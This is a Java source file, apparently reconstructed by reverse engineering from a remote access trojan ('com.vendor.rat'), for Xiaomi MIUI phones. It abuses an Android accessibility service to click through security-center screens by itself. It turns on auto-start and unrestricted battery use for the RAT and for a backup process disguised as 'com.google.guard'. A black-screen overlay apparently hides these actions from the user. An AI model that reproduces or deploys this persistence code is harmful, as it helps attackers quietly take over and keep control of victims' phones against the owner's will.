package com.vendor.rat.auto.engine.vendor;

import android.util.Log;
import android.view.accessibility.AccessibilityEvent;

import com.vendor.rat.auto.condition.CombineFilter;
import com.vendor.rat.auto.engine.AutoEngine;
import com.vendor.rat.auto.entity.UiNode;
import com.vendor.rat.service.MyAccessibilityService;

import java.util.ArrayList;
import java.util.List;
import java.util.Objects;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicReference;

/**
 * 小米厂商适配引擎 (模块 03)
 *
 * 基于逆向分析: o/q.java (498 行)
 *
 * 适配:
 *   - 自启动管理 (com.miui.securitycenter)
 *   - 电池优化 (com.miui.powerkeeper)
 *   - 后台运行
 *   - 关联启动
 *
 * 监听的界面:
 *   - AutoStartManagementActivity (自启动管理)
 *   - HiddenAppsContainerManagementActivity (后台应用管理)
 *   - PermissionsEditorActivity (权限编辑)
 *   - OtherPermissionsActivity (其他权限)
 *   - AlertDialog (确认对话框)
 *
 * 市场份额: ~30%
 */
public class XiaomiEngine extends AutoEngine {

    private static final String TAG = "XiaomiEngine";

    // 小米包名
    private static final String SECURITY_CENTER = "com.miui.securitycenter";
    private static final String POWER_KEEPER = "com.miui.powerkeeper";

    // 小米 Activity
    private static final String AUTO_START_ACTIVITY =
        "com.miui.permcenter.autostart.AutoStartManagementActivity";
    private static final String HIDDEN_APPS_ACTIVITY =
        "com.miui.powerkeeper.ui.HiddenAppsContainerManagementActivity";
    private static final String HIDDEN_APPS_CONFIG_ACTIVITY =
        "com.miui.powerkeeper.ui.HiddenAppsConfigActivity";
    private static final String PERMISSIONS_EDITOR_ACTIVITY =
        "com.miui.permcenter.permissions.PermissionsEditorActivity";
    private static final String OTHER_PERMISSIONS_ACTIVITY =
        "com.miui.permcenter.settings.OtherPermissionsActivity";
    private static final String PERMISSION_APPS_MODIFY_ACTIVITY =
        "com.miui.permcenter.permissions.PermissionAppsModifyActivity";
    private static final String APP_DETAILS_ACTIVITY =
        "com.miui.appmanager.ApplicationsDetailsActivity";
    private static final String APP_MANAGER_MAIN_ACTIVITY =
        "com.miui.appmanager.AppManagerMainActivity";
    private static final String POWER_DETAIL_ACTIVITY =
        "com.miui.powercenter.legacypowerrank.PowerDetailActivity";
    private static final String ALERT_DIALOG = "miuix.appcompat.app.AlertDialog";
    private static final String SETTINGS = "com.android.settings";

    // ====== 状态常量 — 对应逆向 ConcurrentLinkedQueue ======
    private static final String ST_APP_DETAIL = "keepAliveInAppDetail";
    private static final String ST_AUTO_START = "keepAliveInAutoStartManage";
    private static final String ST_APP_PERMS = "keepAliveInAppPermissions";
    private static final String ST_OTHER_PERMS = "keepAliveInOtherPermissions";
    private static final String ST_PERM_MODIFY = "keepAliveInPermissionModify";

    // ====== 保活类型 — 对应逆向 r.e ======
    private static final String KA_UNKNOWN = "KEEP_ALIVE_UNKNOWN";
    private static final String KA_MAIN = "KEEP_ALIVE_MAIN_APP";
    private static final String KA_BACKUP = "KEEP_ALIVE_BACKUP_APP";

    // ====== 状态字段 — 对应逆向 f685r ~ f692y ======
    private final AtomicReference<String> keepAliveType = new AtomicReference<>(KA_UNKNOWN);

    // 主进程 — f686s/f688u/f690w
    private final AtomicBoolean mainAutoStart = new AtomicBoolean(false);     // f686s
    private final AtomicBoolean mainRelateStart = new AtomicBoolean(true);    // f688u
    private final AtomicBoolean mainBackground = new AtomicBoolean(false);    // f690w

    // 备用进程 — f687t/f689v/f691x
    private final AtomicBoolean backupAutoStart = new AtomicBoolean(false);   // f687t
    private final AtomicBoolean backupRelateStart = new AtomicBoolean(true);  // f689v
    private final AtomicBoolean backupBackground = new AtomicBoolean(false);  // f691x

    // 处理中标志 — f692y
    private final AtomicBoolean processing = new AtomicBoolean(false);

    // 完成状态
    private final AtomicBoolean autoStartDone = new AtomicBoolean(false);
    private final AtomicBoolean batteryDone = new AtomicBoolean(false);
    private final AtomicBoolean backgroundDone = new AtomicBoolean(false);

    // 应用名称
    private String appName;

    // 窗口检测分组
    private final List<WindowMatcher> appDetailWins = new ArrayList<>();
    private final List<WindowMatcher> autoStartWins = new ArrayList<>();
    private final List<WindowMatcher> powerDetailWins = new ArrayList<>();

    public XiaomiEngine() {
        super(buildWindowMatchers(), SECURITY_CENTER);
        buildDetectionGroups();

        // 定时检查任务: 每 100 秒 — 对应逆向: schedule(new p(this, 0), 100L, SECONDS)
        try {
            scheduler.schedule(new Runnable() {
                @Override
                public void run() {
                    checkPermissionStatus();
                }
            }, 100L, TimeUnit.SECONDS);
        } catch (Exception e) {
            Log.e(TAG, "Schedule failed", e);
        }
    }

    private void buildDetectionGroups() {
        // f0() — App详情: ApplicationsDetailsActivity / AppManagerMainActivity / FrameLayout
        appDetailWins.add(new WindowMatcher(SECURITY_CENTER,
            "com.miui.appmanager.ApplicationsDetailsActivity"));
        appDetailWins.add(new WindowMatcher(SECURITY_CENTER,
            "com.miui.appmanager.AppManagerMainActivity"));
        appDetailWins.add(new WindowMatcher(SECURITY_CENTER,
            "android.widget.FrameLayout"));

        // h0() — 自启动管理
        autoStartWins.add(new WindowMatcher(SECURITY_CENTER, AUTO_START_ACTIVITY));

        // g0() — 省电策略
        powerDetailWins.add(new WindowMatcher(POWER_KEEPER, HIDDEN_APPS_CONFIG_ACTIVITY));
        powerDetailWins.add(new WindowMatcher(SECURITY_CENTER,
            "com.miui.powercenter.legacypowerrank.PowerDetailActivity"));
    }

    /**
     * 构建窗口匹配列表
     * 基于逆向: q.l0()
     */
    private static List<WindowMatcher> buildWindowMatchers() {
        List<WindowMatcher> list = new ArrayList<>();

        // vendor l0():97 — 电池优化对话框 (共享 c.J())
        list.add(new WindowMatcher(SETTINGS, "android.app.Dialog")
            .addEventType(32).addEventType(16384));

        // vendor l0():98 — 自启动管理
        list.add(new WindowMatcher(SECURITY_CENTER, AUTO_START_ACTIVITY)
            .addEventType(32).addEventType(16384));

        // vendor l0():99-102 — 后台应用管理
        list.add(new WindowMatcher(POWER_KEEPER, HIDDEN_APPS_ACTIVITY)
            .addEventType(32).addEventType(16384));

        // vendor l0():103-104 — App详情 (主/备份包名)
        list.add(new WindowMatcher(SECURITY_CENTER, APP_DETAILS_ACTIVITY)
            .addEventType(32).addEventType(16384));
        list.add(new WindowMatcher(SECURITY_CENTER, APP_DETAILS_ACTIVITY)
            .addEventType(32).addEventType(16384));

        // vendor l0():105-106 — AppManager (主/备份包名)
        list.add(new WindowMatcher(SECURITY_CENTER, APP_MANAGER_MAIN_ACTIVITY)
            .addEventType(32).addEventType(16384));
        list.add(new WindowMatcher(SECURITY_CENTER, APP_MANAGER_MAIN_ACTIVITY)
            .addEventType(32).addEventType(16384));

        // vendor l0():107-108 — FrameLayout (主/备份包名)
        list.add(new WindowMatcher(SECURITY_CENTER, "android.widget.FrameLayout")
            .addEventType(32).addEventType(16384));
        list.add(new WindowMatcher(SECURITY_CENTER, "android.widget.FrameLayout")
            .addEventType(32).addEventType(16384));

        // vendor l0():109 — 省电策略配置
        list.add(new WindowMatcher(POWER_KEEPER, HIDDEN_APPS_CONFIG_ACTIVITY)
            .addEventType(32).addEventType(16384));

        // vendor l0():110 — 电量详情
        list.add(new WindowMatcher(SECURITY_CENTER, POWER_DETAIL_ACTIVITY)
            .addEventType(32).addEventType(16384));

        // vendor l0():111-114 — 权限编辑/其他权限/权限修改
        list.add(new WindowMatcher(SECURITY_CENTER, PERMISSIONS_EDITOR_ACTIVITY)
            .addEventType(32).addEventType(16384));
        list.add(new WindowMatcher(SECURITY_CENTER, OTHER_PERMISSIONS_ACTIVITY)
            .addEventType(32).addEventType(16384));
        list.add(new WindowMatcher(SECURITY_CENTER, PERMISSION_APPS_MODIFY_ACTIVITY)
            .addEventType(32).addEventType(16384));

        // vendor l0():126-135 — MIUI AlertDialog
        list.add(new WindowMatcher(POWER_KEEPER, ALERT_DIALOG)
            .addEventType(32).addEventType(16384));
        list.add(new WindowMatcher(SECURITY_CENTER, ALERT_DIALOG)
            .addEventType(32).addEventType(16384));

        return list;
    }

    // ============ 窗口检测 — 对应逆向 f0/g0/h0 ============

    /** 对应逆向: q.f0() — App详情窗口 */
    private boolean f0() { return matchesAny(appDetailWins); }

    /** 对应逆向: q.g0() — 省电策略窗口 */
    private boolean g0() { return matchesAny(powerDetailWins); }

    /** 对应逆向: q.h0() — 自启动管理窗口 */
    private boolean h0() { return matchesAny(autoStartWins); }

    // ============ 事件处理 — 对齐逆向 u() ============

    /**
     * 对应逆向: q.u(AccessibilityEvent, String, String)
     * 注意: vendor 先检查 f692y (processing), 然后只有 2 个状态分支
     */
    @Override
    public void onAccessibilityEvent(AccessibilityEvent event, String packageName,
                                     String className) {
        try {
            if (isCompleted()) return;

            currentPackage = packageName;
            currentClassName = className;

            // vendor o/q.java u():464-465 — super.u() 处理电池优化对话框
            if (event != null) {
                checkBatteryOptimizationDialog();
            }

            // 对应逆向: if (this.f692y.get()) return;
            if (processing.get()) return;

            boolean inAppDetail = f0();

            if (inAppDetail) {
                stateQueue.remove(ST_AUTO_START);
                stateQueue.remove(ST_APP_PERMS);
                stateQueue.remove(ST_OTHER_PERMS);
                stateQueue.remove(ST_PERM_MODIFY);
                if (!stateQueue.contains(ST_APP_DETAIL)) {
                    stateQueue.add(ST_APP_DETAIL);
                    // case 1: 处理 App 详情 → 电池优化
                    scheduler.execute(new Runnable() {
                        @Override
                        public void run() { handleAppDetailState(); }
                    });
                }
            }
            if (h0()) {
                stateQueue.remove(ST_APP_DETAIL);
                stateQueue.remove(ST_APP_PERMS);
                stateQueue.remove(ST_OTHER_PERMS);
                stateQueue.remove(ST_PERM_MODIFY);
                if (!stateQueue.contains(ST_AUTO_START)) {
                    stateQueue.add(ST_AUTO_START);
                    // case 2: 处理自启动管理
                    scheduler.execute(new Runnable() {
                        @Override
                        public void run() { handleAutoStartState(); }
                    });
                }
            }
        } catch (Exception e) {
            logError("事件处理异常", e);
        }
    }

    @Override
    public void onWindowMatched(String packageName, String className,
                                AccessibilityEvent event) {
        // 由 onAccessibilityEvent 处理
    }

    @Override
    public void execute() {
        // ADAPT: vendor 通过外部启动应用详情页触发
    }

    // ============ 过滤器构建 — 对应逆向 b0/d0 ============

    /** 对应逆向: q.d0() — 省电策略文本 */
    private CombineFilter buildPowerSavingFilter() {
        return buildTextViewFilter("MIUI_SETTINGS_POWER_SAVING_STRATEGY_TEXT");
    }

    /** 对应逆向: q.b0() — 电量消耗文本 */
    private CombineFilter buildPowerConsumeFilter() {
        return buildTextViewFilter("MIUI_APP_POWER_CONSUME_TEXT");
    }

    // ============ 状态处理 — 对应逆向 p(Runnable) case 1/2 ============

    /**
     * case 1: App详情 → 电池优化
     * 对应逆向: p.run() case 1 → q.c0()
     */
    private void handleAppDetailState() {
        try {
            updateProgress(10);
            UiNode scrollView = getScrollableNode();
            UiNode target = null;

            CombineFilter powerSaving = buildPowerSavingFilter();
            CombineFilter powerConsume = buildPowerConsumeFilter();

            if (scrollView != null) {
                // 对应逆向: q.c0() — 先滚到底部，再向上找
                scrollView.scrollForwardEnd();
                scrollView.refresh();
                if (powerSaving != null) {
                    target = scrollView.scrollBackwardUntil(powerSaving);
                }
                if (target == null && powerConsume != null) {
                    target = scrollView.scrollForwardUntil(powerConsume);
                }
            } else {
                // 直接在根节点查找
                if (powerSaving != null) {
                    target = k() != null ? k().findOneByCombine(powerSaving) : null;
                }
                if (target == null && powerConsume != null) {
                    target = k() != null ? k().findOneByCombine(powerConsume) : null;
                }
            }

            if (target != null) {
                Log.d(TAG, "耗电策略查找成功:" + target);
                updateProgress(20);
                UiNode clickableParent = target.findClickableParent();
                if (clickableParent != null && clickableParent.click()) {
                    Log.d(TAG, "已点击电量消耗、耗电策略栏目:" + clickableParent);
                    updateProgress(30);
                    // 等待省电策略窗口出现 — 对应逆向: 最多 20 次 * 2秒
                    for (int i = 0; !g0() && i < 20; i++) {
                        Log.d(TAG, "正在查找电量消耗、耗电策略窗口");
                        T0(2);
                    }
                    // k0(): 选择无限制
                    handlePowerDetailPage();
                } else {
                    Log.e(TAG, "查找并点击耗电策略栏目失败");
                }
            } else {
                Log.e(TAG, "耗电策略、电量栏目查找失败");
            }
        } catch (Exception e) {
            logError("handleAppDetailState", e);
        }
    }

    /**
     * 处理省电策略详情页 — 选择"无限制"
     * 对应逆向: q.k0() (method dump skipped, reconstructed from context)
     */
    private void handlePowerDetailPage() {
        // TODO: VENDOR_VERIFY — q.k0() 反编译失败，根据上下文重建
        try {
            UiNode root = getRootNode();
            if (root == null) return;

            UiNode unlimited = root.findOneByTextContains("无限制");
            if (unlimited != null) {
                unlimited.click();
                Log.d(TAG, "已选择无限制");
                mainBackground.set(true);
                T0(5);
                performBack();
            } else {
                Log.e(TAG, "无限制选项未找到");
            }
        } catch (Exception e) {
            logError("handlePowerDetailPage", e);
        }
    }

    /**
     * case 2: 自启动管理
     * 对应逆向: p.run() case 2 → q.i0(appName)
     */
    private void handleAutoStartState() {
        try {
            boolean isMain = Objects.equals(keepAliveType.get(), KA_MAIN);
            String targetName = isMain ? getAppName() : getBackupAppName();

            UiNode scrollView = getScrollableNode();
            if (scrollView == null) {
                // 对应逆向: q.r0() — 手动滑动刷新
                Log.e(TAG, "自启动管理滚动视图查找失败");
                // 直接在根节点查找
                UiNode target = k() != null ? k().findOneByCombine(
                    CombineFilter.textView(targetName)) : null;
                if (target != null) {
                    handleAutoStartItem(target);
                }
                return;
            }

            Log.d(TAG, "自启动管理滚动视图查找成功");
            CombineFilter textFilter = CombineFilter.textView(targetName);
            UiNode target = scrollView.scrollForwardUntil(textFilter);
            if (target == null) {
                target = scrollView.scrollBackwardUntil(textFilter);
            }

            if (target != null) {
                handleAutoStartItem(target);
            } else {
                Log.e(TAG, "自启动栏目查找失败");
            }
        } catch (Exception e) {
            logError("handleAutoStartState", e);
        }
    }

    /**
     * 处理自启动项 — 查找可点击父节点 → 检查/点击
     * 对应逆向: q.i0() 中的 CheckedResult 逻辑
     */
    private void handleAutoStartItem(UiNode target) {
        UiNode clickableParent = target.findClickableParent();
        if (clickableParent == null) {
            clickableParent = target.findParentUtilCombine(
                    com.vendor.rat.auto.condition.CombineFilter.clickable());
        }
        if (clickableParent == null) {
            Log.e(TAG, "自启动栏目查找失败");
            return;
        }
        Log.d(TAG, "自启动栏目查找成功");

        // vendor o/q.java i0():326 — 使用基类 O(parent) 操作 Switch/CheckBox
        com.vendor.rat.auto.entity.CheckedResult result = O(clickableParent);
        if (result.isClicked() || result.isChecked()) {
            Log.d(TAG, "已点击，已勾选App自启动");
            boolean isMain = Objects.equals(keepAliveType.get(), KA_MAIN);
            if (isMain) {
                mainAutoStart.set(true);
            } else {
                backupAutoStart.set(true);
            }
        } else {
            Log.e(TAG, "未勾选App自启动");
        }
    }

    // ============ 完成处理 — 对应逆向 j0() ============

    /**
     * 对应逆向: q.j0()
     * 主进程完成后切换到备用进程，或结束引擎
     */
    private void handleCompletion() {
        try {
            processing.set(true);
            // ADAPT: vendor calls a1.q.b()

            boolean isMain = Objects.equals(keepAliveType.get(), KA_MAIN);
            if (isMain) {
                if (!mainAutoStart.get()) {
                    processing.set(false);
                    // 重新启动自启动管理
                    startSilent(SECURITY_CENTER, AUTO_START_ACTIVITY);
                    Log.d(TAG, "启动MIUI自启动管理");
                    return;
                }
                saveState(getAppName());
                stateQueue.clear();

                // vendor o/q.java j0():372 — 检查备份应用是否已安装
                if (isBackupAppInstalled("com.google.guard")) {
                    keepAliveType.set(KA_BACKUP);
                    processing.set(false);
                    // vendor: g.Z0("com.google.guard") 启动备用进程详情
                    startSilent(SECURITY_CENTER, AUTO_START_ACTIVITY);
                    Log.d(TAG, "已启动 com.google.guard 应用详情");
                } else {
                    finish();
                }
            } else if (Objects.equals(keepAliveType.get(), KA_BACKUP)) {
                if (!backupAutoStart.get()) {
                    processing.set(false);
                    startSilent(SECURITY_CENTER, AUTO_START_ACTIVITY);
                    Log.d(TAG, "启动MIUI自启动管理");
                    return;
                }
                saveState("com.google.guard");
                stateQueue.clear();
                finish();
            }
        } catch (Exception e) {
            logError("handleCompletion", e);
        }
    }

    // ============ 状态保存 — 对应逆向 s0() ============

    /**
     * 对应逆向: q.s0(String packageName)
     */
    private void saveState(String packageName) {
        try {
            if (Objects.equals(packageName, "com.google.guard")) {
                // 备用进程
                Log.d(TAG, "已保存备用进程保活策略"
                    + " bg=" + backupBackground.get()
                    + " auto=" + backupAutoStart.get()
                    + " relate=" + backupRelateStart.get());
            } else {
                // 主进程
                Log.d(TAG, "已保存主进程保活策略"
                    + " bg=" + mainBackground.get()
                    + " auto=" + mainAutoStart.get()
                    + " relate=" + mainRelateStart.get());
            }
        } catch (Exception e) {
            logError("saveState", e);
        }
    }

    // ============ 结束引擎 — 对应逆向 Z() ============

    @Override
    public void finish() {
        if (lock.tryLock()) {
            try {
                if (!isCompleted()) {
                    Log.d(TAG, "准备结束本地保活自动化引擎");
                    // vendor o/q.java Z():182 — g.h(100)
                    updateProgress(100);
                    // vendor o/q.java Z():183 — X() 暂停事件处理
                    X();

                    if (MyAccessibilityService.getInstance() != null) {
                        // vendor o/q.java Z():184-185 — P().x() 清理无障碍缓存
                        MyAccessibilityService.getInstance().H(true, true);
                    }

                    // vendor o/q.java Z():187-193 — 保存状态
                    if (Objects.equals(keepAliveType.get(), KA_MAIN)) {
                        saveState(getAppName());
                    }
                    if (Objects.equals(keepAliveType.get(), KA_BACKUP)) {
                        saveState("com.google.guard");
                    }

                    // vendor o/q.java Z():194-196
                    scheduler.shutdownNow();
                    stateQueue.clear();

                    // vendor o/q.java Z():197-199 — 等待+移除遮罩
                    T0(5);
                    removeBlackScreen();

                    Log.d(TAG, "已结束本地保活自动化引擎");

                    // vendor o/q.java Z():202 — c.W() 通知策略线程
                    if (com.vendor.rat.MainApplication.getInstance() != null) {
                        com.vendor.rat.MainApplication.getInstance()
                            .offerStrategyEvent("PREPARE_FOR_APP_CONFIRM_LOCK");
                    }
                }
            } catch (Exception e) {
                logError("finish", e);
            } finally {
                lock.unlock();
            }
        }
        super.finish();
    }

    // ============ 工具方法 ============

    private String getAppName() {
        return appName != null ? appName : "com.vendor.rat";
    }

    private String getBackupAppName() {
        return "com.google.guard";
    }

    /**
     * 检查备份应用是否已安装
     * 对应 vendor: g.d0("com.google.guard") != null
     */
    private boolean isBackupAppInstalled(String packageName) {
        try {
            android.content.Context ctx = getContext();
            if (ctx == null) return false;
            ctx.getPackageManager().getPackageInfo(packageName, 0);
            return true;
        } catch (Exception e) {
            return false;
        }
    }

    private void checkPermissionStatus() {
        if (mainAutoStart.get() && mainBackground.get()) {
            log("All Xiaomi permissions granted");
            finish();
        }
    }

    public void setAppName(String appName) {
        this.appName = appName;
    }
}
